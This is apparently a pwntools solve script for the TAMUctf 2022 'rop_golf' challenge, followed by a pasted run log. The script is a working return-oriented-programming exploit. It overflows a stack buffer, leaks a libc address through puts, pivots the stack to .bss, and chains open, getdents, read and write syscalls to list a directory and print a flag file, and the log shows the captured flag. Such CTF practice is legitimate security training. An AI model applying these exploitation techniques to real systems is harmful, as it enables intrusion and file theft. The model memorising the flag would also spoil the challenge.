from pwn import *

context(os='linux', arch='amd64')
#context.log_level = 'debug'

BINARY = './rop_golf'
elf  = ELF(BINARY)

if len(sys.argv) > 1 and sys.argv[1] == 'r':
  s = remote("tamuctf.com", 443, ssl=True, sni="rop-golf")
  libc = ELF("./libc.so.6")
  pop_rax_ret_offset = 0x03a638 # pop rax; ret;
  pop_rdx_ret_offset = 0x106153 # pop rdx; pop r10; ret;
  syscall_ret_offset = 0x0b58a5 # syscall; ret;
  xchg_eax_edi_ret_offset = 0x116dbc # xchg eax, edi; ret;
else: 
  s = process(BINARY)
  libc = elf.libc
  pop_rax_ret_offset = 0x047400 # pop rax; ret;
  pop_rdx_ret_offset = 0x119241 # pop rdx; pop r12; ret;
  syscall_ret_offset = 0x0630d9 # syscall; ret;
  xchg_eax_edi_ret_offset = 0xf1b95 # xchg eax, edi; ret;
  
pop_rdi_ret = 0x4011fb # pop rdi; ret;
pop_rsi_ret = 0x4011f9 # pop rsi; pop r15; ret;
bss_addr    = 0x404100
leave_ret   = 0x401161 # leave; ret;

s.recvuntil("hi!\n")

buf  = b"A"*40
buf += p64(pop_rdi_ret)
buf += p64(elf.got.puts)
buf += p64(elf.plt.puts)
buf += p64(elf.sym.main)
s.send(buf)

puts_addr = u64(s.recvuntil("\n")[:-1]+b"\x00\x00")
libc_base = puts_addr - libc.sym.puts
gets_addr = libc_base + libc.sym.gets
pop_rax_ret = libc_base + pop_rax_ret_offset
pop_rdx_ret = libc_base + pop_rdx_ret_offset
syscall_ret = libc_base + syscall_ret_offset
xchg_eax_edi_ret = libc_base + xchg_eax_edi_ret_offset
print("puts_addr =", hex(puts_addr))
print("libc_base =", hex(libc_base))

s.recvuntil("hi!\n")

'''
buf  = b"A"*32
buf += p64(bss_addr)
buf += p64(pop_rdi_ret)
buf += p64(bss_addr)
buf += p64(gets_addr)
buf += p64(leave_ret)
pause()
s.send(buf)

sleep(0.2)
buf  = b"./"
buf += b"\x00"*(8-len(buf))
buf += p64(pop_rax_ret)
buf += p64(2)
buf += p64(pop_rdi_ret)
buf += p64(bss_addr)
buf += p64(pop_rsi_ret)
buf += p64(0)*2
buf += p64(pop_rdx_ret)
buf += p64(0x200000)   # O_DIRECTORY
buf += p64(0)
buf += p64(syscall_ret)
buf += p64(pop_rdi_ret)
buf += p64(0)
buf += p64(xchg_eax_edi_ret)
buf += p64(pop_rax_ret)
buf += p64(78)         # sys_getdents
buf += p64(pop_rsi_ret)
buf += p64(bss_addr + 0x100)
buf += p64(0)
buf += p64(pop_rdx_ret)
buf += p64(0x400)
buf += p64(0)
buf += p64(syscall_ret)
buf += p64(pop_rax_ret)
buf += p64(1)
buf += p64(pop_rdi_ret)
buf += p64(1)
buf += p64(syscall_ret)
s.sendline(buf)

# filename = 066A2462DEB399BA9183A91FC116914C.txt
'''

buf  = b"A"*32
buf += p64(bss_addr+0x20)
buf += p64(pop_rdi_ret)
buf += p64(bss_addr)
buf += p64(gets_addr)
buf += p64(leave_ret)
s.send(buf)

sleep(0.2)
buf  = b"./066A2462DEB399BA9183A91FC116914C.txt"
buf += b"\x00"*(40-len(buf))
buf += p64(pop_rax_ret)
buf += p64(2)
buf += p64(pop_rdi_ret)
buf += p64(bss_addr)
buf += p64(pop_rsi_ret)
buf += p64(0)*2
buf += p64(pop_rdx_ret)
buf += p64(0)
buf += p64(0)
buf += p64(syscall_ret)
buf += p64(pop_rdi_ret)
buf += p64(0)
buf += p64(xchg_eax_edi_ret)
buf += p64(pop_rax_ret)
buf += p64(0)         
buf += p64(pop_rsi_ret)
buf += p64(bss_addr + 0x200)
buf += p64(0)
buf += p64(pop_rdx_ret)
buf += p64(0x80)
buf += p64(0)
buf += p64(syscall_ret)
buf += p64(pop_rax_ret)
buf += p64(1)
buf += p64(pop_rdi_ret)
buf += p64(1)
buf += p64(syscall_ret)
s.sendline(buf)

s.interactive()

'''
mito@ubuntu:~/CTF/TAMUctf_2022/Pwn_Rop_Golf$ python3 solve.py r
[*] '/home/mito/CTF/TAMUctf_2022/Pwn_Rop_Golf/rop_golf'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to tamuctf.com on port 443: Done
[*] '/home/mito/CTF/TAMUctf_2022/Pwn_Rop_Golf/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
solve.py:29: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  s.recvuntil("hi!\n")
solve.py:38: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  puts_addr = u64(s.recvuntil("\n")[:-1]+b"\x00\x00")
puts_addr = 0x7f3164696910
libc_base = 0x7f3164625000
solve.py:48: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  s.recvuntil("hi!\n")
[*] Switching to interactive mode
gigem{r34lly_p1v071n6_7h47_574ck}\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00[
'''
